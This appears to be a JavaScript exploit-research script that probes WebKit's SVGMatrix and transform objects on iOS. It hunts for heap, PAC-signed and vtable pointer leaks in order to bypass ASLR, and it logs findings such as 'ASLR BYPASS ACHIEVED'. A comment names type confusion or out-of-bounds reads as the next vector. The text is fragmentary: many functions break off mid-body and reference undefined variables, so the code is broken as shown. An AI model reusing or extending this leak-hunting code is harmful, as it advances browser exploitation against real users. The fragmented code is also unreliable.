var NS='http://www.w3.org/2000/svg';

var _fb=new ArrayBuffer(8);
var _dv=new Float64Array(_fb);
var _uv=new Uint32Array(_fb);
function f64hi(f){_dv[0]=f;return _uv[1];}
function f64lo(f){_dv[0]=f;return _uv[0];}
function f64hex(f){
  if(f===null||f===undefined)return 'null';
  _dv[0]=f;
  return'0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0');
}
function fromHiLo(hi,lo){_uv[1]=hi>>>0;_uv[0]=lo>>>0;return _dv[0];}

// arm64e pointer heuristics
function classifyPtr(v){
  if(v===null||v===undefined||isNaN(v)||!isFinite(v))return null;
  _dv[0]=v;
  var hi=_uv[1]; var lo=_uv[0];
  // arm64e user: 0x00000001_xxxxxxxx or 0x0000000x_xxxxxxxx
  if(hi===0x00000001)return{type:'arm64_user',hi:hi,lo:lo};
  if(hi===0x00000000&&lo>0x1000)return{type:'arm64_low',hi:hi,lo:lo};
  // tagged / PAC-signed: 0x001xxxxx
  if(hi>=0x00100000&&hi<=0x001fffff)return{type:'arm64_pac',hi:hi,lo:lo};
  // JSC heap cells: 0x0001xxxx
  if(hi>=0x00010000&&hi<=0x0001ffff)return{type:'jsc_cell',hi:hi,lo:lo};
  // WebCore native heap: often 0x000xxxxx range on iOS
  if(hi>=0x00000002&&hi<=0x0000ffff)return{type:'native_heap',hi:hi,lo:lo};
  // kernel/high: 0xffff...
  if(hi>=0xffff0000)return{type:'kernel',hi:hi,lo:lo};
  return null;
}

function mkSVG(){
  var s=document.createElementNS(NS,'svg');
  s.setAttribute('width','100');s.setAttribute('height','100');
  s.style.cssText='position:fixed;left:0;top:0;width:100px;height:100px;opacity:0.001;pointer-events:none';
  document.body.appendChild(s);return s;
}
function mkRect(p){
  var r=document.createElementNS(NS,'rect');
  r.setAttribute('x','0');r.setAttribute('y','0');
  r.setAttribute('width','10');r.setAttribute('height','10');
  p.appendChild(r);return r;
}
function getMX(el){
  el.setAttribute('transform','matrix(1 0 0 1 0 0)');
  return el.transform.baseVal.getItem(0).matrix;
}
function ctm(el){try{return el.getScreenCTM();}catch(e){return null;}}

// ════════════════════════════════════════════════════════════════════════
// SB — shared backing deep dive
// confirm TY[3]: getItem(0) twice = same backing
// map exactly what mx2 sees when we write each field of mx1

  var sameObj=(mx1===mx2);

  // write to each field of mx1, read ALL fields of mx2
  // this maps the internal field layout cross-alias
  var fields=['a','b','c','d','e','f'];

  hdr('SB[2]: write each mx1 field, read all mx2 fields');
  fields.forEach(function(wf){
    // reset
    mx1.a=1;mx1.b=0;mx1.c=0;mx1.d=1;mx1.e=0;mx1.f=0;
    mx1[wf]=testVal;
    var row={};
    fields.forEach(function(rf){row[rf]=mx2[rf];});
    // find which mx2 field got the written value
    var seen=fields.filter(function(rf){return row[rf]===testVal;});
    var leaked=fields.filter(function(rf){return rf!==wf&&row[rf]!==0&&row[rf]!==1&&rf!=='a'&&rf!=='d';});
    log('SB[2]: write mx1.'+wf+'=CANARY → mx2: a='+f64hex(row.a)+' b='+f64hex(row.b)+

      'info — canary not in mx2 (independent)');

  var svg3=mkSVG();

  fields.forEach(function(f){

    log('SB[3]:   .'+f+'='+f64hex(v)+'  ('+v+')',
      p?'ptr — POINTER-LIKE: type='+p.type+' hi=0x'+p.hi.toString(16)+' lo=0x'+p.lo.toString(16):'info');
  });

  svg.remove();svg3.remove();
  prog('SB done');
}

// ════════════════════════════════════════════════════════════════════════
// PS — pointer scan: harvest raw internal values from many elements
// create N fresh elements, read their initial matrix values via getItem(0) x2
// collect all values, classify as pointers, look for patterns
// ════════════════════════════════════════════════════════════════════════
function runPS(){

  var N=100;
  var svg=mkSVG();
  var allVals=[];

  for(var i=0;i<N;i++){

      allVals.push({elem:i,field:f,val:mx2[f]});

  // classify all
  var ptrs=allVals.filter(function(v){return classifyPtr(v.val)!==null;});
  var nonStd=allVals.filter(function(v){

  });

  log('PS[1]: total values='+allVals.length+' pointer-like='+ptrs.length+
    ' non-standard='+nonStd.length+' zero-or-identity='+(allVals.length-ptrs.length-nonStd.length),
    ptrs.length>0?'ptr — POINTER-LIKE VALUES FOUND IN MATRIX FIELDS!':
    'info — no pointer-like values (all standard identity matrix)');

  if(ptrs.length>0){
    // show first 10 unique pointer values

      var key=f64hex(p.val);
      if(!seen[key]){
        seen[key]=true;

        log('PS[1]: elem['+p.elem+'].'+p.field+'='+f64hex(p.val)+
          ' type='+cp.type+' hi=0x'+cp.hi.toString(16).padStart(8,'0')+
          ' lo=0x'+cp.lo.toString(16).padStart(8,'0'),
          'ptr — '+cp.type.toUpperCase()+' POINTER LEAK!');
      }
    });

    // check if pointer values are consistent (same object) or varied (different heap addrs)
    var uniquePtrs=Object.keys(seen);
    log('PS[2]: unique pointer values: '+uniquePtrs.length,
      uniquePtrs.length===1?'star — single pointer (vtable/singleton?)':
      uniquePtrs.length>1?'aslr — MULTIPLE DIFFERENT POINTERS: heap layout leaking!':'info');
  }

  if(nonStd.length>0){
    log('PS[3]: non-standard non-pointer values: first='+f64hex(nonStd[0].val)+

// ════════════════════════════════════════════════════════════════════════
// CS — consolidate() stale value decode
// TY[2] showed consolidate() returns same_obj=true but e changed to -2.57e+303
// that value = 0x? — decode the bit pattern and classify

function runCS(){

    var mx2=r.transform.baseVal.getItem(0).matrix;
    if(mx2){
      var stale=mx2.e;
      staleVals.push(stale);
    }
  }

  var uniqueStale={};
  staleVals.forEach(function(v){
    var k=f64hex(v);
    if(!uniqueStale[k])uniqueStale[k]=0;
    uniqueStale[k]++;

  var ukeys=Object.keys(uniqueStale);
  log('CS[1]: N='+N+' consolidate reads: unique values='+ukeys.length,'info');

  ukeys.forEach(function(k){

// stable address across multiple allocs = likely vtable or class pointer
// ════════════════════════════════════════════════════════════════════════
function runRP(){
  hdr('RP: repeated pointer harvest — vtable/class ptr hunt');
  var ROUNDS=20;
  var svg=mkSVG();
  var ptrCounts={};  // hex → count

  for(var round=0;round<ROUNDS;round++){
    // create fresh batch of 10 rects
    var batch=[];
    for(var i=0;i<10;i++){
      var r=mkRect(svg);
      r.setAttribute('transform','matrix(1 0 0 1 0 0)');
      batch.push(r);
    }
    // read raw from each
    batch.forEach(function(r){
      var mx1=r.transform.baseVal.getItem(0).matrix;
      var mx2=r.transform.baseVal.getItem(0).matrix;
      ['a','b','c','d','e','f'].forEach(function(f){
        var v=mx2[f];
        var p=classifyPtr(v);
        if(p){
          var key=f64hex(v);
          if(!ptrCounts[key])ptrCounts[key]=0;
          ptrCounts[key]++;
        }
      });
    });
    // remove batch
    batch.forEach(function(r){r.remove();});
  }

  var ptrKeys=Object.keys(ptrCounts).sort(function(a,b){return ptrCounts[b]-ptrCounts[a];});
  log('RP[1]: '+ROUNDS+' rounds × 10 elems: found '+ptrKeys.length+' unique pointer-like values','info');

  if(ptrKeys.length===0){
    log('RP[1]: no pointer-like values found in any raw matrix reads','warn');
    log('RP[1]: internal values are always identity matrix (0/1) — no raw heap exposure','info');
  } else {
    ptrKeys.slice(0,10).forEach(function(k){
      var hi=parseInt(k.slice(2,10),16);
      var lo=parseInt(k.slice(11,19),16);
      var fval=fromHiLo(hi,lo);
      var p=classifyPtr(fval);
      log('RP[1]: '+k+' count='+ptrCounts[k]+
        (p?' type='+p.type:''),
        ptrCounts[k]>ROUNDS*5?'aslr — STABLE POINTER (likely vtable)! count='+ptrCounts[k]:
        'ptr — pointer candidate');
    });
  }

  svg.remove();
  prog('RP done');
}

    try{c3=r3.getScreenCTM();}catch(e){}

      ['a','b','c','d','e','f'].forEach(function(f){
        var v=c3[f];
        var p=classifyPtr(v);
        if(p)racePtrs.push({k:k,f:f,val:v,ptr:p});
      });
    }
  }
  if(racePtrs.length>0){
    log('AL[3]: FOUND '+racePtrs.length+' pointer-like values via race CTM read!','aslr');
    racePtrs.slice(0,5).forEach(function(p){
      log('AL[3]: elem['+p.k+'].'+p.f+'='+f64hex(p.val)+' type='+p.ptr.type,'ptr');
    });
  } else {
    log('AL[3]: no pointers via race CTM read','info');
  }
  svg3.remove();

  // summary
  hdr('AL[4]: ASLR bypass summary');
  var totalPtrs=foundPtrs.length+noTxPtrs.length+racePtrs.length;
  log('AL[4]: total pointer-like leaks: consolidate='+foundPtrs.length+
    ' no-tx='+noTxPtrs.length+' race='+racePtrs.length+' TOTAL='+totalPtrs,
    totalPtrs>0?'aslr — ASLR BYPASS ACHIEVED: '+totalPtrs+' pointer leaks!':
    'warn — no pointer leaks found this run (SVGMatrix init is clean)');

  if(totalPtrs===0){
    log('AL[4]: WebKit initializes SVGMatrix fields to identity (0/1) before JS sees them','info');
    log('AL[4]: next vector: look for uninitialized reads via type confusion or OOB','star');
  }

  prog('AL done — v34 complete');
}
